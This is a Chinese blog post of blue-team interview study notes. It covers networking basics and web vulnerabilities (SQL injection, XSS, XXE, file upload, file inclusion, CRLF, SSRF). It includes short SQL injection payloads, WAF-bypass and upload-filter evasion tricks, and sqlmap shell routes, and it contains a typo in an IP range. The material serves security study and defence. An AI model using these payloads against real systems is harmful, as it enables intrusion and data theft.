<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HVV中级蓝队常见面试问题 | Drblack'Blog</title><meta name="author" content="Drblack"><meta name="copyright" content="Drblack"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="整理人：Drblack 网络基础私有地址段：A类地址范围：10.0.0.0—10.255.255.255；  B类地址范围：172.16.0.0—172.31.255.555；  C类地址范围：192.168.0.0—192.168.255.255 ISO七层模型 TCP、UDP区别 TCP与UDP基本区别 基于连接与无连接  TCP要求系统资源较多，UDP较少；  流模式（TCP）与数据报模式(">
<meta property="og:type" content="article">
<meta property="og:title" content="HVV中级蓝队常见面试问题">
<meta property="og:url" content="https://drblack.top/2023/05/21/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/index.html">
<meta property="og:site_name" content="Drblack&#39;Blog">
<meta property="og:description" content="整理人：Drblack 网络基础私有地址段：A类地址范围：10.0.0.0—10.255.255.255；  B类地址范围：172.16.0.0—172.31.255.555；  C类地址范围：192.168.0.0—192.168.255.255 ISO七层模型 TCP、UDP区别 TCP与UDP基本区别 基于连接与无连接  TCP要求系统资源较多，UDP较少；  流模式（TCP）与数据报模式(">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://drblack.top/img/1000.webp">
<meta property="article:published_time" content="2023-05-21T11:01:41.000Z">
<meta property="article:modified_time" content="2024-10-16T07:20:49.521Z">
<meta property="article:author" content="Drblack">
<meta property="article:tag" content="知识点">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://drblack.top/img/1000.webp"><link rel="shortcut icon" href="/img/1000.webp"><link rel="canonical" href="https://drblack.top/2023/05/21/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="8KYdLccZEOQiOgJvHftvX7-2pkkmhBMvMXO4inbIkLw"/><meta name="baidu-site-verification" content="codeva-t56Dl5qqYL"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HVV中级蓝队常见面试问题',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-16 15:20:49'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

document.addEventListener('pjax:send', () => {
  Pace.restart()
})
</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1000.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Drblack'Blog"><span class="site-name">Drblack'Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HVV中级蓝队常见面试问题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-21T11:01:41.000Z" title="发表于 2023-05-21 19:01:41">2023-05-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-16T07:20:49.521Z" title="更新于 2024-10-16 15:20:49">2024-10-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">16.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>51分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HVV中级蓝队常见面试问题"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>整理人：Drblack</p>
<h2 id="网络基础"><a href="#网络基础" class="headerlink" title="网络基础"></a>网络基础</h2><h3 id="私有地址段："><a href="#私有地址段：" class="headerlink" title="私有地址段："></a>私有地址段：</h3><p>A类<strong>地址</strong>范围：10.0.0.0—10.255.255.255； </p>
<p>B类<strong>地址</strong>范围：172.16.0.0—172.31.255.555； </p>
<p>C类<strong>地址</strong>范围：192.168.0.0—192.168.255.255</p>
<h3 id="ISO七层模型"><a href="#ISO七层模型" class="headerlink" title="ISO七层模型"></a><strong>ISO七层模型</strong></h3><p><img src="/images/osi.png" alt="image-osi"></p>
<p>TCP、UDP区别</p>
<h3 id="TCP与UDP基本区别"><a href="#TCP与UDP基本区别" class="headerlink" title="TCP与UDP基本区别"></a><strong>TCP与UDP基本区别</strong></h3><ol>
<li><p>基于连接与无连接</p>
</li>
<li><p>TCP要求系统资源较多，UDP较少；</p>
</li>
<li><p>流模式（TCP）与数据报模式(UDP);</p>
</li>
<li><p>TCP保证数据正确性，UDP可能丢包</p>
</li>
<li><p>TCP保证数据顺序，UDP不保证</p>
</li>
<li><p>TCP 有流量控制（拥塞控制），UDP 没有</p>
</li>
</ol>
<p>   TCP 协议的流量控制是基于滑窗协议实现的。 </p>
<h3 id="TCP握手和挥手"><a href="#TCP握手和挥手" class="headerlink" title="TCP握手和挥手"></a>TCP握手和挥手</h3><p>三次握手、四次挥手</p>
<p><img src="/images/tcp2.png" alt="image-20230522162925101"></p>
<h3 id="HTTP和HTTPS"><a href="#HTTP和HTTPS" class="headerlink" title="HTTP和HTTPS"></a>HTTP和HTTPS</h3><p>HTTP 超文本传输协议 端口80</p>
<p>HTTPS 是支持加密和验证的HTTP。端口443</p>
<p> <strong>两种协议的唯一区别是HTTPS 使用TLS (SSL) 来加密普通的HTTP 请求和响应，并对这些请求和响应进行数字签名</strong></p>
<h3 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h3><p>SSL通过握手在客户端和服务器之间建立会话，完成通信双方身份的验证、密钥和加密套件的协商，从而确保客户端与服务器之间的通信不被窃听，保证网络上数据传输的安全性。</p>
<p>SSL为<strong>HTTP</strong>提供安全连接，可以防止<code>中间人攻击</code>和网络监听，从而很大程度上改善了万维网的安全性问题，这就是SSL的起源。</p>
<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>53端口</p>
<h2 id="OWSTP10"><a href="#OWSTP10" class="headerlink" title="OWSTP10"></a>OWSTP10</h2><p>1.SQL 注入：2、失效的身份认证和会话管理 3、跨站脚本攻击 XSS 4、直接引用不安全的对象 5、安全配置错误 6、敏感信息泄露 7、缺少功能级的访问控制 8、跨站请求伪造 CSRF 9、使用含有已知漏洞的组件 10、未验证的重定向和转发</p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><strong>布尔盲注</strong></p>
<p><strong>报错注入：</strong>floor  ExtractValue   updataxml</p>
<p>updataxml</p>
<p>是更新xml文档的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value);</span><br><span class="line"></span><br><span class="line">XML_document：String格式，为XML文档对象的名称</span><br><span class="line"></span><br><span class="line">XPath_string ：Xpath格式的字符串 </span><br><span class="line"></span><br><span class="line">new_value：String格式，替换查找到的符合条件的数据</span><br><span class="line"></span><br><span class="line">常用语句 select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br><span class="line">concat()函数是将里面的内容连成一个字符串，因此上述例子不符合updatexml函数中间的XPATH_string的格式，从而出现格式错误，爆出需要的内容</span><br></pre></td></tr></table></figure>

<p>ExtractValue</p>
<p>extractvalue函数与updatexml函数类似，extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语法：extractvalue(目标xml文档，xml路径)</span><br><span class="line"></span><br><span class="line">其中第二个参数不符合XML路径格式就会报错。</span><br></pre></td></tr></table></figure>

<p>floor</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">实现报错的原因是：虚拟表的主键重复</span><br><span class="line"></span><br><span class="line">因为临时表的主键中并不存在test0，在插入前，floor(rand(0)*2)又计算一次，拼接后与test1，但是是直接插入，即使临时表中已经有了主键test1也硬要插入，从而导致主键重复报错</span><br><span class="line"></span><br><span class="line">参考文章：https://cloud.tencent.com/developer/article/2018961</span><br></pre></td></tr></table></figure>

<p><strong>时间盲注</strong></p>
<p><strong>堆叠注入</strong></p>
<p>成因是存在mysqli_multi_query函数</p>
<p><strong>宽字节注入:</strong></p>
<ol>
<li>正常情况下GPC开启或者使用addslashes函数过滤GET或POST提交的参数时，我们测试输入的’，就会被转义为&#39;;</li>
<li>若存在宽字节注入，输入<code>%df%27</code>即<code>%df&#39;</code>时，经过单引号的转义变成了<code>%df%5c%27</code>即<code>%df\&#39;</code>，之后再数据库查询语句进行GBK多字节编码，即一个中文占用两个字节，一个英文同样占用两个字节且在汉字编码范围内两个编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成汉字”運”,单引号<code>逃逸</code>出来，从而绕过转义造成注入漏洞。</li>
</ol>
<p>二次注入：</p>
<p>​			可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
<p><img src="/images/image-20241016084643414.png" alt="image-20241016084643414"></p>
<p>User-Agent头注入</p>
<p>Cookie注入</p>
<p>万能密码</p>
<p><strong>常见waf绕过办法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">1 大小写绕过</span><br><span class="line">此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。</span><br><span class="line"></span><br><span class="line">2 替换关键字双写</span><br><span class="line">这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</span><br><span class="line"></span><br><span class="line">http://www.xx.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</span><br><span class="line">3 注释</span><br><span class="line"></span><br><span class="line">//   -- /**/ #  --+ -- - ; %00  --a</span><br><span class="line"></span><br><span class="line">3.空格绕过</span><br><span class="line">()代替 两个空格代替一个空格； 用Tab代替空格  %0a代替空格   还有最基本的利用注释替换空格：/**/</span><br><span class="line"></span><br><span class="line">4  内联注释</span><br><span class="line">有些WAF的过滤关键词像/union\sselect/g，就比如上面说的，很多时候我都是采用内联注释。更复杂的例子需要更先进的方法。比如添加了SQL关键字，我们就要进一步分离这两个词来绕过这个过滤器。</span><br><span class="line"></span><br><span class="line">id=1/*!UnIoN*/SeLeCT</span><br><span class="line">/*!select*//*!**//*!from*//*!yz*/;</span><br><span class="line">5 替换关键字双写绕过</span><br><span class="line">这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</span><br><span class="line"></span><br><span class="line">SELselectECT 1,2,3,4</span><br><span class="line">6 URL编码</span><br><span class="line">有时后台界面会再次URL解码所以这时可以利用二次编码解决问题</span><br><span class="line"></span><br><span class="line">7 引号绕过(使用十六进制)</span><br><span class="line"></span><br><span class="line">9 比较符(&lt;,&gt;)绕过</span><br><span class="line">同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest，strcmp来进行绕过了。</span><br><span class="line"></span><br><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br><span class="line"></span><br><span class="line">select strcmp(left(database(),1),0x32);#lpad(&#x27;asd&#x27;,2,0)</span><br><span class="line"></span><br><span class="line">if(substr(id,1,1)in(0x41),1,3)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>sqlmap获取shell</strong></p>
<ul>
<li>union select 后写入</li>
<li>利用分隔符写入类似于SQLMAP的 –os-shell命令</li>
<li>Mysql log写入（有读写的权限，root权限，gpc关闭、绝对路径）</li>
</ul>
<p><strong>SQL注入常见WAF如 D盾 安全狗怎么绕：</strong></p>
<p>unicode编码绕过、注释语句绕过、类型转换绕过、关键字拆分绕过、大小写绕过</p>
<p><strong>预防方法</strong></p>
<ul>
<li>预编译</li>
<li>PDO</li>
<li>正则过滤</li>
</ul>
<p><strong>SQL注入读取文件</strong></p>
<ul>
<li>load_file()</li>
</ul>
<p><strong>SQL注入漏洞怎么修复</strong></p>
<ul>
<li>黑名单</li>
<li>白名单</li>
<li>敏感字符过滤 </li>
<li>使用框架安全查询</li>
<li>不要把网站的错误信息返回给客户端</li>
<li>WAF</li>
<li>数据库审计 </li>
<li>云防护 </li>
<li>IPS(入侵防御系统)</li>
</ul>
<p><strong>mysql中like查询会会非常缓慢，如何进行优化</strong></p>
<ul>
<li>分词索引</li>
</ul>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">第一种：反射型XSS攻击</span><br><span class="line"></span><br><span class="line">反射型XSS攻击一般是攻击者通过特定手法，诱使用户去访问一个包含恶意代码的URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类XSS攻击通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端Cookies或进行钓鱼欺骗</span><br><span class="line"></span><br><span class="line">第二种：DOM-based型XSS攻击</span><br><span class="line"></span><br><span class="line">DOM型XSS是基于DOM文档对象模型的一种漏洞。严格地说，DOM型XSS其实算反射型XSS，区别在于DOM型XSS并不会和后台进行交互，是完完全全的Web前端安全问题，要做防御也只能在客户端上进行防御。</span><br><span class="line"></span><br><span class="line">首先，客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它并不与服务端进行交互而是从客户端获得DOM中的数据（如从URL中获取数据）并在本地执行；其次，浏览器用户可以操纵DOM中的一些对象如URL、location等；因此，当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。</span><br><span class="line"></span><br><span class="line">需要特别注意以下的用户输入源document.URL、location.hash、location.search、document.referrer等。</span><br><span class="line"></span><br><span class="line">第三种：存储型XSS攻击</span><br><span class="line"></span><br><span class="line">攻击者事先将恶意代码上传或者储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此存储型XSS攻击的危害会更大。此类攻击一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>xml外部实体注入，发生在应用程序解析XML输入时，<code>没有禁止外部实体的加载</code>，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
<p><strong>危害：</strong></p>
<p>1.DOS攻击</p>
<p>2.SSRF攻击</p>
<p>3.使用file协议读取任意文件</p>
<p>4.端口探测</p>
<p>5.执行系统命令</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul>
<li>本地js绕过</li>
<li>MIME验证绕过（Content-Type）</li>
<li>制作图片马</li>
<li>.htaccess上传</li>
<li>00截断</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">后缀名更改：比如PHP3、PHP5；</span><br><span class="line"></span><br><span class="line">后缀名大小写绕过：PHP</span><br><span class="line"></span><br><span class="line">后缀名双写绕过：PPHHPP</span><br><span class="line"></span><br><span class="line">后缀名后加空格：php+空格</span><br><span class="line"></span><br><span class="line">后缀名后加“.”：php.</span><br></pre></td></tr></table></figure>

<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
<p><strong>php引发文件包含漏洞的四个函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">include()</span><br><span class="line">include_once()</span><br><span class="line">require()</span><br><span class="line">require_once()</span><br><span class="line"></span><br><span class="line">include()和require()的区别：</span><br><span class="line">require()如果在包含过程中出错，就会直接退出，不执行后续语句</span><br><span class="line">include()如果在包含过程中出错，只会提出警告，但不影响后续语句的执行</span><br></pre></td></tr></table></figure>

<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a><strong>本地文件包含漏洞</strong></h4><p>顾名思义，指的是能打开并包含本地文件的漏洞。大多数情况下遇到的文件包含漏洞都是本地文件包含漏洞。</p>
<h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a><strong>远程文件包含漏洞</strong></h4><p>是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在，危害性会很大。<br>但远程文件包含漏洞的利用条件较为苛刻，需要php.ini中配置<br><code>allow_url_fopen=On</code>  <code>allow_url_include=On</code></p>
<p>利用协议：file、php伪协议、http伪协议、zip:&#x2F;&#x2F;伪协议</p>
<h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p>重点：需要有http请求，才能利用crlf，要不然没法将构造的数据包发出去</p>
<p>CRLF 指的是回车符<code>（CR，ASCII 13，\r，%0d）</code>和换行符<code>（LF，ASCII 10，\n，%0a）</code>的简称（<code>\r\n</code>）</p>
<p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。</p>
<p>所以，<code>一旦我们能够控制 HTTP 消息头中的字符</code>，注入一些恶意的换行，这样我们就能注入一些恶意的HTTP Header，如会话Cookie，甚至可以注入一些HTML代码。这就是CRLF注入漏洞的核心原理。</p>
<p>在实际应用中，如果Web应用没有对用户输入做严格验证，便会导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出。</p>
<p>在拼接http响应头的过程中，服务器检测到<code>\r\n</code>的时候会按照http规范认为已经到达一行的末尾，后面的数据输出到下一行。在对文件进行io读写的时候也经常会以<code>\r\n</code>或者<code>\n</code>作为判断行末尾的依据，后面的数据换行后再输出，这两个的原理是一样的。<br>CRLF这种攻击本质和sql注入、xss一样，都是由于没有对用户输入进行完全检查与过滤导致的漏洞，区别在于sql注入作用在数据库，xss的效果体现在网页主体，clrf则会将恶意代码输出在响应头中。</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>服务器端请求伪造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容</span><br><span class="line"></span><br><span class="line">如果没有对指定URL做过滤措施，就有可能存在SSRF漏洞</span><br><span class="line"></span><br><span class="line">修复：可以通过url白名单或限制内网ip呀，过滤返回信息呀，统一错误信息呀等进行防护。</span><br></pre></td></tr></table></figure>

<p>问题函数：curl()，file_get_contents()，fsockopen()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file:///  -- 本地文件传输协议，主要用于访问本地计算机中的文件</span><br><span class="line"></span><br><span class="line">dict://   -- 字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628 </span><br><span class="line"></span><br><span class="line">sftp://   -- SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol） </span><br><span class="line"></span><br><span class="line">ldap://   -- 轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议</span><br><span class="line"></span><br><span class="line">tftp://   -- 